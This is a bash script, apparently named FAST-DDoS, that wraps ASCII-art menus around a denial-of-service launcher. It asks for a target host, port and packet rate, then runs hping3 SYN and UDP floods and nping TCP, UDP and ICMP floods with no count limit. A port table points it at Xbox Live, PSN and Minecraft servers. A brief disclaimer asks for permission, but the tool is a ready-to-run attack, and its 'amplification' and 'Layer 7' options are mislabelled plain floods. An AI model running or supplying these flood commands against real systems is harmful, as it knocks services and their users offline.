#!/bin/bash
clear

# Function to display centered, rainbow-colored ASCII art vertically
function display_ascii_art {
echo -e "\e[1;32mWELCOME TO FAST-DDoS!\e[0m | \e[1;34mCREATOR: rickroll747\e[0m | \e[1;33mLicensed with Custom License!\e[0m"
    echo -e "\n\n"
    local lines=(
        "  █████▄▄▄       ██████▄▄▄█████▓█████▄▓█████▄ ▒█████   ██████ "
        "▓██   ▒████▄   ▒██    ▒▓  ██▒ ▓▒██▀ ██▒██▀ ██▒██▒  ██▒██    ▒ "
        "▒████ ▒██  ▀█▄ ░ ▓██▄  ▒ ▓██░ ▒░██   █░██   █▒██░  ██░ ▓██▄   "
        "░▓█▒  ░██▄▄▄▄██  ▒   ██░ ▓██▓ ░░▓█▄   ░▓█▄   ▒██   ██░ ▒   ██▒"
        "░▒█░   ▓█   ▓██▒██████▒▒ ▒██▒ ░░▒████▓░▒████▓░ ████▓▒▒██████▒▒"
        " ▒ ░   ▒▒   ▓▒█▒ ▒▓▒ ▒ ░ ▒ ░░   ▒▒▓  ▒ ▒▒▓  ▒░ ▒░▒░▒░▒ ▒▓▒ ▒ ░"
        " ░      ▒   ▒▒ ░ ░▒  ░ ░   ░    ░ ▒  ▒ ░ ▒  ▒  ░ ▒ ▒░░ ░▒  ░ ░"
        " ░ ░    ░   ▒  ░  ░  ░   ░      ░ ░  ░ ░ ░  ░░ ░ ░ ▒ ░  ░  ░  "
        "            ░  ░     ░            ░      ░       ░ ░       ░  "
        "                                ░      ░                      "
		"  --●═━═━═━═━═━═━═━═❴Rickroll747❵═━═━═━═━═━═━═━═●--  "
        "           - - - - - DDoS Tool - - - - -          "
        "                Made By Rickroll747               "
        " GITHUB: https://github.com/rickroll747/FAST-DDoS/ "
        "  --●═━═━═━═━═━━═━═━═❴FAST-DDoS❵═━═━═━═━═━━═━═━═●--  "
    )
    local colors=("\e[31m" "\e[33m" "\e[32m" "\e[36m" "\e[34m" "\e[35m")
    for ((i = 0; i < ${#lines[@]}; i++)); do
        line="${lines[i]}"
        for ((j = 0; j < ${#line}; j++)); do
            color_index=$((j % ${#colors[@]}))
            echo -ne "${colors[color_index]}${line:j:1}"
        done
        echo -e "\e[0m"
    done
    echo -e "\n\n"
}

function display_layer7_art {
    clear
    local aqua="\e[96m"
    local red="\e[31m"
    local reset="\e[0m"

    local lines=(
        "888             d8888 Y88b   d88P 8888888888 8888888b.        8888888888  (HTTPS/HTTP)"
        "888            d88888  Y88b d88P  888        888   Y88b             d88P "
        "888           d88P888   Y88o88P   888        888    888            d88P  "
        "888          d88P 888    Y888P    8888888    888   d88P           d88P   "
        "888         d88P  888     888     888        8888888P\"         88888888  "
        "888        d88P   888     888     888        888 T88b           d88P     "
        "888       d8888888888     888     888        888  T88b         d88P      "
        "88888888 d88P     888     888     8888888888 888   T88b       d88P       "
    )

    local total_lines=${#lines[@]}
    local half_lines=$(( total_lines / 2 ))

    for i in "${!lines[@]}"; do
        if (( i < half_lines )); then
            echo -e "${aqua}${lines[i]}${reset}"
        else
            echo -e "${red}${lines[i]}${reset}"
        fi
    done
    echo ""
}

function display_layer4_art {
    clear
    local aqua="\e[96m"
    local red="\e[31m"
    local reset="\e[0m"

    local lines=(
        "888             d8888 Y88b   d88P 8888888888 8888888b.            d8888   (TCP/UDP)"
        "888            d88888  Y88b d88P  888        888   Y88b          d8P888  "
        "888           d88P888   Y88o88P   888        888    888         d8P 888  "
        "888          d88P 888    Y888P    8888888    888   d88P        d8P  888  "
        "888         d88P  888     888     888        8888888P\"        d88   888  "
        "888        d88P   888     888     888        888 T88b         8888888888 "
        "888       d8888888888     888     888        888  T88b              888  "
        "88888888 d88P     888     888     8888888888 888   T88b             888  "
    )

    local total_lines=${#lines[@]}
    local half_lines=$(( total_lines / 2 ))

    for i in "${!lines[@]}"; do
        if (( i < half_lines )); then
            echo -e "${aqua}${lines[i]}${reset}"
        else
            echo -e "${red}${lines[i]}${reset}"
        fi
    done
    echo ""
}

function display_amp_art {
    clear
    local aqua="\e[96m"
    local red="\e[31m"
    local reset="\e[0m"

    local lines=(
        "       d8888 888b     d888 8888888b.  "
        "      d88888 8888b   d8888 888   Y88b "
        "     d88P888 88888b.d88888 888    888 "
        "    d88P 888 888Y88888P888 888   d88P "
        "   d88P  888 888 Y888P 888 8888888P\"  "
        "  d88P   888 888  Y8P  888 888        "
        " d8888888888 888   \"   888 888        "
        "d88P     888 888       888 888        "
    )


    local total_lines=${#lines[@]}
    local half_lines=$(( total_lines / 2 ))

    for i in "${!lines[@]}"; do
        if (( i < half_lines )); then
            echo -e "${aqua}${lines[i]}${reset}"
        else
            echo -e "${red}${lines[i]}${reset}"
        fi
    done
    echo ""
}

function display_icmp_art {
    clear
    local aqua="\e[96m"  # Light aqua
    local red="\e[31m"
    local reset="\e[0m"

    local lines=(
        "  888  .d8888b.  888b     d888 8888888b.   (Layer 3)"
        "  888 d88P  Y88b 8888b   d8888 888   Y88b "
        "  888 888    888 88888b.d88888 888    888 "
        "  888 888        888Y88888P888 888   d88P "
        "  888 888        888 Y888P 888 8888888P\"  "
        "  888 888    888 888  Y8P  888 888        "
        "  888 Y88b  d88P 888   \"   888 888        "
        "  888  \"Y8888P\"  888       888 888        "
    )

    local total_lines=${#lines[@]}
    local half_lines=$(( total_lines / 2 ))

    for i in "${!lines[@]}"; do
        if (( i < half_lines )); then
            echo -e "${aqua}${lines[i]}${reset}"
        else
            echo -e "${red}${lines[i]}${reset}"
        fi
    done
    echo ""
}

function show_credits {
    local red="\e[31m"         # Red
    local white="\e[97m"       # White
    local green="\e[32m"       # Green
    local yellow="\e[33m"      # Yellow 
    local reset="\e[0m"

    local lines=(
        "  Credits: "
        "  Tiktok: @_j33ls "
        "  Github: @rickroll747 "
        "  Gmail: rickrolll.747@gmail.com "
        "  Gamejolt: @CameraGuy7854 "
        "  Youtube: @rickroll747 "
    )

    local total_lines=${#lines[@]}
    local third_lines=$(( total_lines / 3 ))

    for i in "${!lines[@]}"; do
        if (( i < third_lines )); then
            echo -e "${red}${lines[i]}${reset}"         # Red part
        elif (( i >= third_lines && i < third_lines * 2 )); then
            if [[ "${lines[i]}" == *"Gmail:"* ]]; then
                # Highlight the "ll" in Gmail in yellow
                echo -e "${white}${lines[i]//kro/${yellow}kro${reset}}"
            elif [[ "${lines[i]}" == *"Github:"* ]]; then
                # Highlight the "roll" in Github in yellow
                echo -e "${white}${lines[i]//ick/${yellow}ick${reset}}"
            else
                echo -e "${white}${lines[i]}${reset}"       # White part (Middle section)
            fi
        else
            echo -e "${green}${lines[i]}${reset}"       # Green part
        fi
    done
    echo ""

    sleep 2
}

function show_ports {
clear
echo -e "\e[1;32m                                       ╔═══════════════╗\e[0m"
echo -e "\e[1;32m                                       ║\e[0m     \e[1;36mPorts\e[0m     \e[1;32m║\e[0m"
echo -e "\e[1;32m                ╔══════════════════════╩═══════════════╩══════════════════════╗\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m53   \e[0m - \e[1;36mDNS (UDP/TCP)\e[0m                  \e[1;36mICMP\e[0m - \e[1;32mNone \e[1;32m        ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m443  \e[0m - \e[1;36mHTTPS\e[0m                          \e[1;36mTCP\e[0m  - \e[1;32m80 \e[1;32m          ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m80   \e[0m - \e[1;36mHTTP\e[0m                           \e[1;36mUDP\e[0m  - \e[1;32m80 \e[1;32m          ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m443  \e[0m - \e[1;36mWeb Domains\e[0m \e[1;32m(HTTP/HTTPS)                           ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m80   \e[0m - \e[1;36mHOSTNAME\e[0m\e[1;32m (ICMP/UDP/TCP)                            ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m53   \e[0m - \e[1;36mDNS HOSTNAME *UDP-BASED DNS HOST/SERVER*\e[0m \e[1;32m(UDP)     ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m53   \e[0m - \e[1;36mDNS HOSTNAME\e[0m \e[1;32m(AMP)                                 ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32mNone \e[0m - \e[1;36mPC HOSTNAME *Network Attack*\e[0m \e[1;32m(ICMP)                ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m443  \e[0m - \e[1;36mPC HOSTNAME [HTTPS] *RESOURECE EXHAUSTION*\e[0m \e[1;32m(TCP)   ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m80   \e[0m - \e[1;36mPC HOSTNAME [HTTP]  *RESOURECE EXHAUSTION*\e[0m \e[1;32m(TCP)   ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m443  \e[0m - \e[1;36mPC HOSTNAME [HTTPS] *CPU EXHAUSTION*  \e[0m \e[1;32m(TCP)       ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m80   \e[0m - \e[1;36mPC HOSTNAME [HTTP]  *CPU EXHAUSTION*  \e[0m \e[1;32m(TCP)       ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m3074 \e[0m - \e[1;36mXBOX LIVE MULTIPLAYER & PARTY CHAT\e[0m\e[1;32m     (UDP)       ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m88   \e[0m - \e[1;36mXBOX LIVE MULTIPLAYER & MATCHMAKING\e[0m\e[1;32m    (UDP)       ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m500  \e[0m - \e[1;36mXBOX LIVE MATCHMAKING (NAT traversal) \e[0m\e[1;32m (UDP)       ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m3478 \e[0m - \e[1;36mPSN PARTY/VOICE-CHAT \e[0m\e[1;32m(UDP/AMP)                     ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m443  \e[0m - \e[1;36mPSN LOGIN/STORE/WEBSITE \e[0m\e[1;32m(Layer 7)                  ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m3074 \e[0m - \e[1;36mPSN MULTIPLAYER GAME TRAFFIC SERVERS\e[0m\e[1;32m (AMP/UDP)     ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m10080\e[0m - \e[1;36mPSN MULTIPLAYER GAME SERVERS\e[0m\e[1;32m (AMP/UDP)             ║\e[0m"
echo -e "\e[1;32m                ║  \e[0m\e[1;32m25565\e[0m - \e[1;36mMINECRAFT SERVERS \e[0m\e[1;32m(AMP/UDP)                        ║\e[0m"
echo -e "\e[1;32m                ╚═════════════════════════════════════════════════════════════╝\e[0m"

sleep 2
}

function show_rules {
    clear
    local yellow="\e[0;33m"
    local red="\e[0;31m"
    local reset="\e[0m"

    local lines=(
        "8888888b.  888     888 888      8888888888  .d8888b.  "
        "888   Y88b 888     888 888      888        d88P  Y88b"
        "888    888 888     888 888      888        Y88b.     "
        "888   d88P 888     888 888      8888888     \"Y888b.  "
        "8888888P\"  888     888 888      888            \"Y88b."
        "888 T88b   888     888 888      888              \"888"
        "888  T88b  Y88b. .d88P 888      888        Y88b  d88P"
        "888   T88b  \"Y88888P\"  88888888 8888888888  \"Y8888P\" "
    )

    for i in "${!lines[@]}"; do
        if [ $i -lt $((${#lines[@]} / 2)) ]; then
            echo -e "${yellow}${lines[$i]}${reset}"
        else
            echo -e "${red}${lines[$i]}${reset}"
        fi
    done
    echo ""

    echo "============================ RULES OF USAGE ============================"
    echo "1. **Permission Required:** Only use this tool on servers or systems for which you have explicit permission to test."
    echo "2. **Legal Compliance:** Unauthorized testing on public or private systems without permission is illegal and may result in legal consequences."
    echo "3. **No Malicious Intent:** Do not use this tool for malicious purposes."
    echo "4. **Be Responsible:** Use this tool responsibly and ethically."
	echo "5. **Goverment Websites:** Do NOT use this tool to DDoS Goverment Sites."
    echo "========================================================================"
    echo ""

sleep 2
}

function main_menu {
    echo "Select an option:"
    echo "1. View Rules & Disclaimers of Usage"
	echo "2. View Ports & Methods Of Usage"
    echo "3. Proceed to Tool"
	echo "4. View Credits"
    echo "5. Exit"
    read -p "Enter your choice (1/2/3/4/5): " main_choice

    case $main_choice in
        1) show_rules; main_menu ;;
		2) show_ports; main_menu ;;
        3) select_tool ;;
		4) show_credits; main_menu ;;
        5) echo "Exiting the program. Stay ethical!"; exit 0 ;;
        *) echo "Invalid choice. Please enter a valid option."; main_menu ;;
    esac
}

function select_tool {
    read -p "Enter the target IP address or hostname: " target
    read -p "Enter the port to target (e.g., 80): " port
    read -p "Enter the rate of packets (1-1000000000): " rate

    echo "Select the method you want to use:"
    echo "1. Layer 4 (TCP SYN Flood)"
    echo "2. Layer 4 (UDP Flood)"
    echo "3. Layer 7 (HTTP)"
    echo "4. Amplification (AMP)"
    echo "5. Layer 3 (ICMP Flood)"
    read -p "Enter your choice (1/2/3/4/5): " method_choice

    case $method_choice in
        1)
            display_layer4_art
            echo "Sending TCP SYN flood with hping3... Press Ctrl + C to stop."
            sudo hping3 -S -p "$port" -V --flood "$target"
            ;;
        2)
            display_layer4_art
            echo "Sending UDP flood with hping3... Press Ctrl + C to stop."
            sudo hping3 --udp -p "$port" -V --flood "$target"
            ;;
        3)
            display_layer7_art
            echo "Sending Layer 7 (HTTP) packets... Press Ctrl + C to stop."
            sudo nping --tcp -p "$port" --rate "$rate" --count 0 "$target"
            ;;
        4)
            display_amp_art
            echo "Sending Amplification-style traffic... Press Ctrl + C to stop."
            sudo nping --udp -p "$port" --rate "$rate" --count 0 "$target"
            ;;
        5)
            display_icmp_art
            echo "Sending ICMP flood with nping... Press Ctrl + C to stop."
            sudo nping --icmp --rate "$rate" --count 0 "$target"
            ;;
        *)
            echo "Invalid choice. Please enter a valid option."
            select_tool
            ;;
    esac
}

# Start the program
display_ascii_art
main_menu
